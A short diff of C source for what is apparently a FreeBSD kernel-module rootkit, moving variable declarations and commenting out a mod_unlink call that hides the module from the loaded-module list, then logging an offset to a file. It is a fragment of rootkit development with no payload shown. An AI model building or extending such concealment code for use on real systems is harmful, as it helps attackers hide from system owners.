@@ -70,14 +70,15 @@ static struct sysent rootkit_sysent = {
 /* The function called at load/unload. */
 static int load(struct module *module, int cmd, void *arg) {
 	int error = 0;
+	int testfd = 0;
+
+	char buf[256] = {0};
 
 	switch (cmd) {
 		case MOD_LOAD:
-			mod_unlink(module, cmd, arg);
+			//mod_unlink(module, cmd, arg);
 
-			int testfd = 0;
-
-			char buf[256] = {0};
+			
 			snprintf(buf, 256, "%d\n", offset);
 
 			filewriter_openlog(curthread, &testfd, LOGFILE);
